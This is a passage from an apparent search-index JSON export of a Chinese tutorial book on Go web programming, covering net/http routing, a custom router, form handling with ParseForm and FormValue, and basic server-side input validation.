\"\"\n}\nreturn\n}\n</code></pre> \u539f\u6765\u4ed6\u662f\u6839\u636e\u7528\u6237\u8bf7\u6c42\u7684URL\u548c\u8def\u7531\u5668\u91cc\u9762\u5b58\u50a8\u7684map\u53bb\u5339\u914d\u7684\uff0c\u5f53\u5339\u914d\u5230\u4e4b\u540e\u8fd4\u56de\u5b58\u50a8\u7684handler\uff0c\u8c03\u7528\u8fd9\u4e2ahandler\u7684ServeHTTP\u63a5\u53e3\u5c31\u53ef\u4ee5\u6267\u884c\u5230\u76f8\u5e94\u7684\u51fd\u6570\u4e86\u3002</p> <p>\u901a\u8fc7\u4e0a\u9762\u8fd9\u4e2a\u4ecb\u7ecd\uff0c\u6211\u4eec\u4e86\u89e3\u4e86\u6574\u4e2a\u8def\u7531\u8fc7\u7a0b\uff0cGo\u5176\u5b9e\u652f\u6301\u5916\u90e8\u5b9e\u73b0\u7684\u8def\u7531\u5668 <code>ListenAndServe</code>\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5c31\u662f\u7528\u4ee5\u914d\u7f6e\u5916\u90e8\u8def\u7531\u5668\u7684\uff0c\u5b83\u662f\u4e00\u4e2aHandler\u63a5\u53e3\uff0c\u5373\u5916\u90e8\u8def\u7531\u5668\u53ea\u8981\u5b9e\u73b0\u4e86Handler\u63a5\u53e3\u5c31\u53ef\u4ee5,\u6211\u4eec\u53ef\u4ee5\u5728\u81ea\u5df1\u5b9e\u73b0\u7684\u8def\u7531\u5668\u7684ServeHTTP\u91cc\u9762\u5b9e\u73b0\u81ea\u5b9a\u4e49\u8def\u7531\u529f\u80fd\u3002</p> <p>\u5982\u4e0b\u4ee3\u7801\u6240\u793a\uff0c\u6211\u4eec\u81ea\u5df1\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7b80\u6613\u7684\u8def\u7531\u5668 <pre><code>package main\n\nimport (\n\"fmt\"\n\"net/http\"\n)\n\ntype MyMux struct {\n}\n\nfunc (p *MyMux) ServeHTTP(w http.ResponseWriter, r *http.Request) {\nif r.URL.Path == \"/\" {\nsayhelloName(w, r)\nreturn\n}\nhttp.NotFound(w, r)\nreturn\n}\n\nfunc sayhelloName(w http.ResponseWriter, r *http.Request) {\nfmt.Fprintf(w, \"Hello myroute!\")\n}\n\nfunc main() {\nmux := &amp;MyMux{}\nhttp.ListenAndServe(\":9090\", mux)\n}\n</code></pre></p>"},{"location":"03.4/#go","title":"Go\u4ee3\u7801\u7684\u6267\u884c\u6d41\u7a0b","text":"<p>\u901a\u8fc7\u5bf9http\u5305\u7684\u5206\u6790\u4e4b\u540e\uff0c\u73b0\u5728\u8ba9\u6211\u4eec\u6765\u68b3\u7406\u4e00\u4e0b\u6574\u4e2a\u7684\u4ee3\u7801\u6267\u884c\u8fc7\u7a0b\u3002</p> <ul> <li> <p>\u9996\u5148\u8c03\u7528Http.HandleFunc</p> <p>\u6309\u987a\u5e8f\u505a\u4e86\u51e0\u4ef6\u4e8b\uff1a</p> <p>1 \u8c03\u7528\u4e86DefaultServeMux\u7684HandleFunc</p> <p>2 \u8c03\u7528\u4e86DefaultServeMux\u7684Handle</p> <p>3 \u5f80DefaultServeMux\u7684map[string]muxEntry\u4e2d\u589e\u52a0\u5bf9\u5e94\u7684handler\u548c\u8def\u7531\u89c4\u5219</p> </li> <li> <p>\u5176\u6b21\u8c03\u7528http.ListenAndServe(\":9090\", nil)</p> <p>\u6309\u987a\u5e8f\u505a\u4e86\u51e0\u4ef6\u4e8b\u60c5\uff1a</p> <p>1 \u5b9e\u4f8b\u5316Server</p> <p>2 \u8c03\u7528Server\u7684ListenAndServe()</p> <p>3 \u8c03\u7528net.Listen(\"tcp\", addr)\u76d1\u542c\u7aef\u53e3</p> <p>4 \u542f\u52a8\u4e00\u4e2afor\u5faa\u73af\uff0c\u5728\u5faa\u73af\u4f53\u4e2dAccept\u8bf7\u6c42</p> <p>5 \u5bf9\u6bcf\u4e2a\u8bf7\u6c42\u5b9e\u4f8b\u5316\u4e00\u4e2aConn\uff0c\u5e76\u4e14\u5f00\u542f\u4e00\u4e2agoroutine\u4e3a\u8fd9\u4e2a\u8bf7\u6c42\u8fdb\u884c\u670d\u52a1go c.serve()</p> <p>6 \u8bfb\u53d6\u6bcf\u4e2a\u8bf7\u6c42\u7684\u5185\u5bb9w, err := c.readRequest()</p> <p>7 \u5224\u65adhandler\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u6ca1\u6709\u8bbe\u7f6ehandler\uff08\u8fd9\u4e2a\u4f8b\u5b50\u5c31\u6ca1\u6709\u8bbe\u7f6ehandler\uff09\uff0chandler\u5c31\u8bbe\u7f6e\u4e3aDefaultServeMux</p> <p>8 \u8c03\u7528handler\u7684ServeHttp</p> <p>9 \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u4e0b\u9762\u5c31\u8fdb\u5165\u5230DefaultServeMux.ServeHttp</p> <p>10 \u6839\u636erequest\u9009\u62e9handler\uff0c\u5e76\u4e14\u8fdb\u5165\u5230\u8fd9\u4e2ahandler\u7684ServeHTTP</p> <pre><code>mux.handler(r).ServeHTTP(w, r)\n</code></pre> <p>11 \u9009\u62e9handler\uff1a</p> <p>A \u5224\u65ad\u662f\u5426\u6709\u8def\u7531\u80fd\u6ee1\u8db3\u8fd9\u4e2arequest\uff08\u5faa\u73af\u904d\u5386ServeMux\u7684muxEntry\uff09</p> <p>B \u5982\u679c\u6709\u8def\u7531\u6ee1\u8db3\uff0c\u8c03\u7528\u8fd9\u4e2a\u8def\u7531handler\u7684ServeHTTP</p> <p>C \u5982\u679c\u6ca1\u6709\u8def\u7531\u6ee1\u8db3\uff0c\u8c03\u7528NotFoundHandler\u7684ServeHTTP</p> </li> </ul>"},{"location":"03.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Go\u5982\u4f55\u4f7f\u5f97web\u5de5\u4f5c</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"03.5/","title":"3.5 \u5c0f\u7ed3","text":"<p>\u8fd9\u4e00\u7ae0\u6211\u4eec\u4ecb\u7ecd\u4e86HTTP\u534f\u8bae, DNS\u89e3\u6790\u7684\u8fc7\u7a0b, \u5982\u4f55\u7528go\u5b9e\u73b0\u4e00\u4e2a\u7b80\u964b\u7684web server\u3002\u5e76\u6df1\u5165\u5230net/http\u5305\u7684\u6e90\u7801\u4e2d\u4e3a\u5927\u5bb6\u63ed\u5f00\u5b9e\u73b0\u6b64server\u7684\u79d8\u5bc6\u3002</p> <p>\u5e0c\u671b\u901a\u8fc7\u8fd9\u4e00\u7ae0\u7684\u5b66\u4e60\uff0c\u4f60\u80fd\u591f\u5bf9Go\u5f00\u53d1Web\u6709\u4e86\u521d\u6b65\u7684\u4e86\u89e3\uff0c\u6211\u4eec\u4e5f\u770b\u5230\u76f8\u5e94\u7684\u4ee3\u7801\u4e86\uff0cGo\u5f00\u53d1Web\u5e94\u7528\u662f\u5f88\u65b9\u4fbf\u7684\uff0c\u540c\u65f6\u53c8\u662f\u76f8\u5f53\u7684\u7075\u6d3b\u3002</p>"},{"location":"03.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Go\u7684http\u5305\u8be6\u89e3</li> <li>\u4e0b\u4e00\u7ae0: \u8868\u5355</li> </ul>"},{"location":"04.0/","title":"4 \u8868\u5355","text":"<p>\u8868\u5355\u662f\u6211\u4eec\u5e73\u5e38\u7f16\u5199Web\u5e94\u7528\u5e38\u7528\u7684\u5de5\u5177\uff0c\u901a\u8fc7\u8868\u5355\u6211\u4eec\u53ef\u4ee5\u65b9\u4fbf\u7684\u8ba9\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u8fdb\u884c\u6570\u636e\u7684\u4ea4\u4e92\u3002\u5bf9\u4e8e\u4ee5\u524d\u5f00\u53d1\u8fc7Web\u7684\u7528\u6237\u6765\u8bf4\u8868\u5355\u90fd\u975e\u5e38\u719f\u6089\uff0c\u4f46\u662f\u5bf9\u4e8eC/C++\u7a0b\u5e8f\u5458\u6765\u8bf4\uff0c\u8fd9\u53ef\u80fd\u662f\u4e00\u4e2a\u6709\u4e9b\u964c\u751f\u7684\u4e1c\u897f\uff0c\u90a3\u4e48\u4ec0\u4e48\u662f\u8868\u5355\u5462\uff1f</p> <p>\u8868\u5355\u662f\u4e00\u4e2a\u5305\u542b\u8868\u5355\u5143\u7d20\u7684\u533a\u57df\u3002\u8868\u5355\u5143\u7d20\uff08\u6bd4\u5982\uff1a\u6587\u672c\u57df\u3001\u4e0b\u62c9\u5217\u8868\u3001\u5355\u9009\u6846\u3001\u590d\u9009\u6846\u7b49\u7b49\uff09\u662f\u5141\u8bb8\u7528\u6237\u5728\u8868\u5355\u4e2d\u8f93\u5165\u4fe1\u606f\u7684\u5143\u7d20\u3002\u8868\u5355\u4f7f\u7528\u8868\u5355\u6807\u7b7e\uff08\\&lt;form&gt;\uff09\u5b9a\u4e49\u3002</p> <pre><code>&lt;form&gt;\n...\ninput \u5143\u7d20\n...\n&lt;/form&gt;\n</code></pre> <p>Go\u91cc\u9762\u5bf9\u4e8eform\u5904\u7406\u5df2\u7ecf\u6709\u5f88\u65b9\u4fbf\u7684\u65b9\u6cd5\u4e86\uff0c\u5728Request\u91cc\u9762\u6709\u4e13\u95e8\u7684form\u5904\u7406\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u6574\u5408\u5230Web\u5f00\u53d1\u91cc\u9762\u6765\uff0c4.1\u5c0f\u8282\u91cc\u9762\u5c06\u8bb2\u89e3Go\u5982\u4f55\u5904\u7406\u8868\u5355\u7684\u8f93\u5165\u3002\u7531\u4e8e\u4e0d\u80fd\u4fe1\u4efb\u4efb\u4f55\u7528\u6237\u7684\u8f93\u5165\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5bf9\u8fd9\u4e9b\u8f93\u5165\u8fdb\u884c\u6709\u6548\u6027\u9a8c\u8bc1\uff0c4.2\u5c0f\u8282\u5c06\u5c31\u5982\u4f55\u8fdb\u884c\u4e00\u4e9b\u666e\u901a\u7684\u9a8c\u8bc1\u8fdb\u884c\u8be6\u7ec6\u7684\u6f14\u793a\u3002</p> <p>HTTP\u534f\u8bae\u662f\u4e00\u79cd\u65e0\u72b6\u6001\u7684\u534f\u8bae\uff0c\u90a3\u4e48\u5982\u4f55\u624d\u80fd\u8fa8\u522b\u662f\u5426\u662f\u540c\u4e00\u4e2a\u7528\u6237\u5462\uff1f\u540c\u65f6\u53c8\u5982\u4f55\u4fdd\u8bc1\u4e00\u4e2a\u8868\u5355\u4e0d\u51fa\u73b0\u591a\u6b21\u9012\u4ea4\u7684\u60c5\u51b5\u5462\uff1f4.3\u548c4.4\u5c0f\u8282\u91cc\u9762\u5c06\u5bf9cookie(cookie\u662f\u5b58\u50a8\u5728\u5ba2\u6237\u7aef\u7684\u4fe1\u606f\uff0c\u80fd\u591f\u6bcf\u6b21\u901a\u8fc7header\u548c\u670d\u52a1\u5668\u8fdb\u884c\u4ea4\u4e92\u7684\u6570\u636e)\u7b49\u8fdb\u884c\u8be6\u7ec6\u8bb2\u89e3\u3002</p> <p>\u8868\u5355\u8fd8\u6709\u4e00\u4e2a\u5f88\u5927\u7684\u529f\u80fd\u5c31\u662f\u80fd\u591f\u4e0a\u4f20\u6587\u4ef6\uff0c\u90a3\u4e48Go\u662f\u5982\u4f55\u5904\u7406\u6587\u4ef6\u4e0a\u4f20\u7684\u5462\uff1f\u9488\u5bf9\u5927\u6587\u4ef6\u4e0a\u4f20\u6211\u4eec\u5982\u4f55\u6709\u6548\u7684\u5904\u7406\u5462\uff1f4.5\u5c0f\u8282\u6211\u4eec\u5c06\u4e00\u8d77\u5b66\u4e60Go\u5904\u7406\u6587\u4ef6\u4e0a\u4f20\u7684\u77e5\u8bc6\u3002</p>"},{"location":"04.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"04.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u4e09\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: \u5904\u7406\u8868\u5355\u7684\u8f93\u5165</li> </ul>"},{"location":"04.1/","title":"4.1 \u5904\u7406\u8868\u5355\u7684\u8f93\u5165","text":"<p>\u5148\u6765\u770b\u4e00\u4e2a\u8868\u5355\u9012\u4ea4\u7684\u4f8b\u5b50\uff0c\u6211\u4eec\u6709\u5982\u4e0b\u7684\u8868\u5355\u5185\u5bb9\uff0c\u547d\u540d\u6210\u6587\u4ef6login.gtpl(\u653e\u5165\u5f53\u524d\u65b0\u5efa\u9879\u76ee\u7684\u76ee\u5f55\u91cc\u9762) <pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form action=\"/login\" method=\"post\"&gt;\n    \u7528\u6237\u540d:&lt;input type=\"text\" name=\"username\"&gt;\n    \u5bc6\u7801:&lt;input type=\"password\" name=\"password\"&gt;\n    &lt;input type=\"submit\" value=\"\u767b\u5f55\"&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> \u4e0a\u9762\u9012\u4ea4\u8868\u5355\u5230\u670d\u52a1\u5668\u7684<code>/login</code>\uff0c\u5f53\u7528\u6237\u8f93\u5165\u4fe1\u606f\u70b9\u51fb\u767b\u5f55\u4e4b\u540e\uff0c\u4f1a\u8df3\u8f6c\u5230\u670d\u52a1\u5668\u7684\u8def\u7531<code>login</code>\u91cc\u9762\uff0c\u6211\u4eec\u9996\u5148\u8981\u5224\u65ad\u8fd9\u4e2a\u662f\u4ec0\u4e48\u65b9\u5f0f\u4f20\u9012\u8fc7\u6765\uff0cPOST\u8fd8\u662fGET\u5462\uff1f</p> <p>http\u5305\u91cc\u9762\u6709\u4e00\u4e2a\u5f88\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u53ef\u4ee5\u83b7\u53d6\uff0c\u6211\u4eec\u5728\u524d\u9762web\u7684\u4f8b\u5b50\u7684\u57fa\u7840\u4e0a\u6765\u770b\u770b\u600e\u4e48\u5904\u7406login\u9875\u9762\u7684form\u6570\u636e <pre><code>package main\n\nimport (\n\"fmt\"\n\"html/template\"\n\"log\"\n\"net/http\"\n\"strings\"\n)\n\nfunc sayhelloName(w http.ResponseWriter, r *http.Request) {\nr.ParseForm()       //\u89e3\u6790url\u4f20\u9012\u7684\u53c2\u6570\uff0c\u5bf9\u4e8ePOST\u5219\u89e3\u6790\u54cd\u5e94\u5305\u7684\u4e3b\u4f53\uff08request body\uff09\n//\u6ce8\u610f:\u5982\u679c\u6ca1\u6709\u8c03\u7528ParseForm\u65b9\u6cd5\uff0c\u4e0b\u9762\u65e0\u6cd5\u83b7\u53d6\u8868\u5355\u7684\u6570\u636e\nfmt.Println(r.Form) //\u8fd9\u4e9b\u4fe1\u606f\u662f\u8f93\u51fa\u5230\u670d\u52a1\u5668\u7aef\u7684\u6253\u5370\u4fe1\u606f\nfmt.Println(\"path\", r.URL.Path)\nfmt.Println(\"scheme\", r.URL.Scheme)\nfmt.Println(r.Form[\"url_long\"])\nfor k, v := range r.Form {\nfmt.Println(\"key:\", k)\nfmt.Println(\"val:\", strings.Join(v, \"\"))\n}\nfmt.Fprintf(w, \"Hello astaxie!\") //\u8fd9\u4e2a\u5199\u5165\u5230w\u7684\u662f\u8f93\u51fa\u5230\u5ba2\u6237\u7aef\u7684\n}\n\nfunc login(w http.ResponseWriter, r *http.Request) {\nfmt.Println(\"method:\", r.Method) //\u83b7\u53d6\u8bf7\u6c42\u7684\u65b9\u6cd5\nif r.Method == \"GET\" {\nt, _ := template.ParseFiles(\"login.gtpl\")\nlog.Println(t.Execute(w, nil))\n} else {\n//\u8bf7\u6c42\u7684\u662f\u767b\u5f55\u6570\u636e\uff0c\u90a3\u4e48\u6267\u884c\u767b\u5f55\u7684\u903b\u8f91\u5224\u65ad\nfmt.Println(\"username:\", r.Form[\"username\"])\nfmt.Println(\"password:\", r.Form[\"password\"])\n}\n}\n\nfunc main() {\nhttp.HandleFunc(\"/\", sayhelloName)       //\u8bbe\u7f6e\u8bbf\u95ee\u7684\u8def\u7531\nhttp.HandleFunc(\"/login\", login)         //\u8bbe\u7f6e\u8bbf\u95ee\u7684\u8def\u7531\nerr := http.ListenAndServe(\":9090\", nil) //\u8bbe\u7f6e\u76d1\u542c\u7684\u7aef\u53e3\nif err != nil {\nlog.Fatal(\"ListenAndServe: \", err)\n}\n}\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u83b7\u53d6\u8bf7\u6c42\u65b9\u6cd5\u662f\u901a\u8fc7<code>r.Method</code>\u6765\u5b8c\u6210\u7684\uff0c\u8fd9\u662f\u4e2a\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u8fd4\u56deGET, POST, PUT\u7b49method\u4fe1\u606f\u3002</p> <p>login\u51fd\u6570\u4e2d\u6211\u4eec\u6839\u636e<code>r.Method</code>\u6765\u5224\u65ad\u662f\u663e\u793a\u767b\u5f55\u754c\u9762\u8fd8\u662f\u5904\u7406\u767b\u5f55\u903b\u8f91\u3002\u5f53GET\u65b9\u5f0f\u8bf7\u6c42\u65f6\u663e\u793a\u767b\u5f55\u754c\u9762\uff0c\u5176\u4ed6\u65b9\u5f0f\u8bf7\u6c42\u65f6\u5219\u5904\u7406\u767b\u5f55\u903b\u8f91\uff0c\u5982\u67e5\u8be2\u6570\u636e\u5e93\u3001\u9a8c\u8bc1\u767b\u5f55\u4fe1\u606f\u7b49\u3002</p> <p>\u5f53\u6211\u4eec\u5728\u6d4f\u89c8\u5668\u91cc\u9762\u6253\u5f00<code>http://127.0.0.1:9090/login</code>\u7684\u65f6\u5019\uff0c\u51fa\u73b0\u5982\u4e0b\u754c\u9762</p> <p></p> <p>\u5982\u679c\u4f60\u770b\u5230\u4e00\u4e2a\u7a7a\u9875\u9762\uff0c\u53ef\u80fd\u662f\u4f60\u5199\u7684 login.gtpl \u6587\u4ef6\u4e2d\u6709\u9519\u8bef\uff0c\u8bf7\u6839\u636e\u63a7\u5236\u53f0\u4e2d\u7684\u65e5\u5fd7\u8fdb\u884c\u4fee\u590d\u3002</p> <p>\u56fe4.1 \u7528\u6237\u767b\u5f55\u754c\u9762</p> <p>\u6211\u4eec\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u4e4b\u540e\u53d1\u73b0\u5728\u670d\u52a1\u5668\u7aef\u662f\u4e0d\u4f1a\u6253\u5370\u51fa\u6765\u4efb\u4f55\u8f93\u51fa\u7684\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cHandler\u91cc\u9762\u662f\u4e0d\u4f1a\u81ea\u52a8\u89e3\u6790form\u7684\uff0c\u5fc5\u987b\u663e\u5f0f\u7684\u8c03\u7528<code>r.ParseForm()</code>\u540e\uff0c\u4f60\u624d\u80fd\u5bf9\u8fd9\u4e2a\u8868\u5355\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u3002\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u4ee3\u7801\uff0c\u5728<code>fmt.Println(\"username:\", r.Form[\"username\"])</code>\u4e4b\u524d\u52a0\u4e00\u884c<code>r.ParseForm()</code>,\u91cd\u65b0\u7f16\u8bd1\uff0c\u518d\u6b21\u6d4b\u8bd5\u8f93\u5165\u9012\u4ea4\uff0c\u73b0\u5728\u662f\u4e0d\u662f\u5728\u670d\u52a1\u5668\u7aef\u6709\u8f93\u51fa\u4f60\u7684\u8f93\u5165\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u4e86\u3002</p> <p><code>r.Form</code>\u91cc\u9762\u5305\u542b\u4e86\u6240\u6709\u8bf7\u6c42\u7684\u53c2\u6570\uff0c\u6bd4\u5982URL\u4e2dquery-string\u3001POST\u7684\u6570\u636e\u3001PUT\u7684\u6570\u636e\uff0c\u6240\u4ee5\u5f53\u4f60\u5728URL\u4e2d\u7684query-string\u5b57\u6bb5\u548cPOST\u51b2\u7a81\u65f6\uff0c\u4f1a\u4fdd\u5b58\u6210\u4e00\u4e2aslice\uff0c\u91cc\u9762\u5b58\u50a8\u4e86\u591a\u4e2a\u503c\uff0cGo\u5b98\u65b9\u6587\u6863\u4e2d\u8bf4\u5728\u63a5\u4e0b\u6765\u7684\u7248\u672c\u91cc\u9762\u5c06\u4f1a\u628aPOST\u3001GET\u8fd9\u4e9b\u6570\u636e\u5206\u79bb\u5f00\u6765\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u4fee\u6539\u4e00\u4e0blogin.gtpl\u91cc\u9762form\u7684action\u503c<code>http://127.0.0.1:9090/login</code>\u4fee\u6539\u4e3a<code>http://127.0.0.1:9090/login?username=astaxie</code>\uff0c\u518d\u6b21\u6d4b\u8bd5\uff0c\u670d\u52a1\u5668\u7684\u8f93\u51fausername\u662f\u4e0d\u662f\u4e00\u4e2aslice\u3002\u670d\u52a1\u5668\u7aef\u7684\u8f93\u51fa\u5982\u4e0b\uff1a</p> <p></p> <p>\u56fe4.2 \u670d\u52a1\u5668\u7aef\u6253\u5370\u63a5\u6536\u5230\u7684\u4fe1\u606f</p> <p><code>request.Form</code>\u662f\u4e00\u4e2aurl.Values\u7c7b\u578b\uff0c\u91cc\u9762\u5b58\u50a8\u7684\u662f\u5bf9\u5e94\u7684\u7c7b\u4f3c<code>key=value</code>\u7684\u4fe1\u606f\uff0c\u4e0b\u9762\u5c55\u793a\u4e86\u53ef\u4ee5\u5bf9form\u6570\u636e\u8fdb\u884c\u7684\u4e00\u4e9b\u64cd\u4f5c: <pre><code>v := url.Values{}\nv.Set(\"name\", \"Ava\")\nv.Add(\"friend\", \"Jess\")\nv.Add(\"friend\", \"Sarah\")\nv.Add(\"friend\", \"Zoe\")\n// v.Encode() == \"name=Ava&amp;friend=Jess&amp;friend=Sarah&amp;friend=Zoe\"\nfmt.Println(v.Get(\"name\"))\nfmt.Println(v.Get(\"friend\"))\nfmt.Println(v[\"friend\"])\n</code></pre></p> <p>Tips:  Request\u672c\u8eab\u4e5f\u63d0\u4f9b\u4e86FormValue()\u51fd\u6570\u6765\u83b7\u53d6\u7528\u6237\u63d0\u4ea4\u7684\u53c2\u6570\u3002\u5982r.Form[\"username\"]\u4e5f\u53ef\u5199\u6210r.FormValue(\"username\")\u3002\u8c03\u7528r.FormValue\u65f6\u4f1a\u81ea\u52a8\u8c03\u7528r.ParseForm\uff0c\u6240\u4ee5\u4e0d\u5fc5\u63d0\u524d\u8c03\u7528\u3002r.FormValue\u53ea\u4f1a\u8fd4\u56de\u540c\u540d\u53c2\u6570\u4e2d\u7684\u7b2c\u4e00\u4e2a\uff0c\u82e5\u53c2\u6570\u4e0d\u5b58\u5728\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002</p>"},{"location":"04.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u8868\u5355</li> <li>\u4e0b\u4e00\u8282: \u9a8c\u8bc1\u8868\u5355\u7684\u8f93\u5165</li> </ul>"},{"location":"04.2/","title":"4.2 \u9a8c\u8bc1\u8868\u5355\u7684\u8f93\u5165","text":"<p>\u5f00\u53d1Web\u7684\u4e00\u4e2a\u539f\u5219\u5c31\u662f\uff0c\u4e0d\u80fd\u4fe1\u4efb\u7528\u6237\u8f93\u5165\u7684\u4efb\u4f55\u4fe1\u606f\uff0c\u6240\u4ee5\u9a8c\u8bc1\u548c\u8fc7\u6ee4\u7528\u6237\u7684\u8f93\u5165\u4fe1\u606f\u5c31\u53d8\u5f97\u975e\u5e38\u91cd\u8981\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u5728\u5fae\u535a\u3001\u65b0\u95fb\u4e2d\u542c\u5230\u67d0\u67d0\u7f51\u7ad9\u88ab\u5165\u4fb5\u4e86\uff0c\u5b58\u5728\u4ec0\u4e48\u6f0f\u6d1e\uff0c\u8fd9\u4e9b\u5927\u591a\u662f\u56e0\u4e3a\u7f51\u7ad9\u5bf9\u4e8e\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f\u6ca1\u6709\u505a\u4e25\u683c\u7684\u9a8c\u8bc1\u5f15\u8d77\u7684\uff0c\u6240\u4ee5\u4e3a\u4e86\u7f16\u5199\u51fa\u5b89\u5168\u53ef\u9760\u7684Web\u7a0b\u5e8f\uff0c\u9a8c\u8bc1\u8868\u5355\u8f93\u5165\u7684\u610f\u4e49\u91cd\u5927\u3002</p> <p>\u6211\u4eec\u5e73\u5e38\u7f16\u5199Web\u5e94\u7528\u4e3b\u8981\u6709\u4e24\u65b9\u9762\u7684\u6570\u636e\u9a8c\u8bc1\uff0c\u4e00\u4e2a\u662f\u5728\u9875\u9762\u7aef\u7684js\u9a8c\u8bc1(\u76ee\u524d\u5728\u8fd9\u65b9\u9762\u6709\u5f88\u591a\u7684\u63d2\u4ef6\u5e93\uff0c\u6bd4\u5982ValidationJS\u63d2\u4ef6)\uff0c\u4e00\u4e2a\u662f\u5728\u670d\u52a1\u5668\u7aef\u7684\u9a8c\u8bc1\uff0c\u6211\u4eec\u8fd9\u5c0f\u8282\u8bb2\u89e3\u7684\u662f\u5982\u4f55\u5728\u670d\u52a1\u5668\u7aef\u9a8c\u8bc1\u3002</p>"},{"location":"04.2/#_1","title":"\u5fc5\u586b\u5b57\u6bb5","text":"<p>\u4f60\u60f3\u8981\u786e\u4fdd\u4ece\u4e00\u4e2a\u8868\u5355\u5143\u7d20\u4e2d\u5f97\u5230\u4e00\u4e2a\u503c\uff0c\u4f8b\u5982\u524d\u9762\u5c0f\u8282\u91cc\u9762\u7684\u7528\u6237\u540d\uff0c\u6211\u4eec\u5982\u4f55\u5904\u7406\u5462\uff1fGo\u6709\u4e00\u4e2a\u5185\u7f6e\u51fd\u6570<code>len</code>\u53ef\u4ee5\u83b7\u53d6\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7len\u6765\u83b7\u53d6\u6570\u636e\u7684\u957f\u5ea6\uff0c\u4f8b\u5982\uff1a <pre><code>if len(r.Form[\"username\"][0])==0{\n//\u4e3a\u7a7a\u7684\u5904\u7406\n}\n</code></pre> <code>r.Form</code>\u5bf9\u4e0d\u540c\u7c7b\u578b\u7684\u8868\u5355\u5143\u7d20\u7684\u7559\u7a7a\u6709\u4e0d\u540c\u7684\u5904\u7406\uff0c \u5bf9\u4e8e\u7a7a\u6587\u672c\u6846\u3001\u7a7a\u6587\u672c\u533a\u57df\u4ee5\u53ca\u6587\u4ef6\u4e0a\u4f20\uff0c\u5143\u7d20\u7684\u503c\u4e3a\u7a7a\u503c,\u800c\u5982\u679c\u662f\u672a\u9009\u4e2d\u7684\u590d\u9009\u6846\u548c\u5355\u9009\u6309\u94ae\uff0c\u5219\u6839\u672c\u4e0d\u4f1a\u5728r.Form\u4e2d\u4ea7\u751f\u76f8\u5e94\u6761\u76ee\uff0c\u5982\u679c\u6211\u4eec\u7528\u4e0a\u9762\u4f8b\u5b50\u4e2d\u7684\u65b9\u5f0f\u53bb\u83b7\u53d6\u6570\u636e\u65f6\u7a0b\u5e8f\u5c31\u4f1a\u62a5\u9519\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u901a\u8fc7<code>r.Form.Get()</code>\u6765\u83b7\u53d6\u503c\uff0c\u56e0\u4e3a\u5982\u679c\u5b57\u6bb5\u4e0d\u5b58\u5728\uff0c\u901a\u8fc7\u8be5\u65b9\u5f0f\u83b7\u53d6\u7684\u662f\u7a7a\u503c\u3002\u4f46\u662f\u901a\u8fc7<code>r.Form.Get()</code>\u53ea\u80fd\u83b7\u53d6\u5355\u4e2a\u7684\u503c\uff0c\u5982\u679c\u662fmap\u7684\u503c\uff0c\u5fc5\u987b\u901a\u8fc7\u4e0a\u9762\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u3002</p>"},{"location":"04.2/#_2","title":"\u6570\u5b57","text":"<p>\u4f60\u60f3\u8981\u786e\u4fdd\u4e00\u4e2a\u8868\u5355\u8f93\u5165\u6846\u4e2d\u83b7\u53d6\u7684\u53ea\u80fd\u662f\u6570\u5b57\uff0c\u4f8b\u5982\uff0c\u4f60\u60f3\u901a\u8fc7\u8868\u5355\u83b7\u53d6\u67d0\u4e2a\u4eba\u7684\u5177\u4f53\u5e74\u9f84\u662f50\u5c81\u8fd8\u662f10\u5c81\uff0c\u800c\u4e0d\u662f\u50cf\u201c\u4e00\u628a\u5e74\u7eaa\u4e86\u201d\u6216\u201c\u5e74\u8f7b\u7740\u5462\u201d\u8fd9\u79cd\u63cf\u8ff0</p> <p>\u5982\u679c\u6211\u4eec\u662f\u5224\u65ad\u6b63\u6574\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u5148\u8f6c\u5316\u6210int\u7c7b\u578b\uff0c\u7136\u540e\u8fdb\u884c\u5904\u7406 <pre><code>getint,err:=strconv.Atoi(r.Form.Get(\"age\"))\nif err!=nil{\n//\u6570\u5b57\u8f6c\u5316\u51fa\u9519\u4e86\uff0c\u90a3\u4e48\u53ef\u80fd\u5c31\u4e0d\u662f\u6570\u5b57\n}\n\n//\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u5224\u65ad\u8fd9\u4e2a\u6570\u5b57\u7684\u5927\u5c0f\u8303\u56f4\u4e86\nif getint &gt;100 